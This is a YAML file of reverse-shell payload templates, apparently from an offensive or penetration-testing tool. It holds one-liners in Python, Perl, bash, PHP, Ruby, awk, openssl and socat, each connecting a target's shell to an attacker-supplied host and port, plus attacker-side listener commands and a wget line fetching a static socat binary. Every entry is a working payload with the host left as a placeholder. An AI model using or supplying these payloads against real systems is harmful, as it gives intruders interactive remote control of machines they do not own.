---
- py:
    code: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
- pl:
    code: perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- sh:
    code: bash -i >& /dev/tcp/{}/{} 0>&1
- php:
    code: php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
- rb:
    code: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
- awk:
    code: awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
- openssl:
    code: |-
       Attacker> ncat --ssl -vv -l -p {}
       Target> mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {}:{} > /tmp/s; rm /tmp/s
- socat:
    code: |-
      Attacker> socat file:`tty`,raw,echo=0 tcp-listen:{}
      Target> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}
      Socat binary> wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
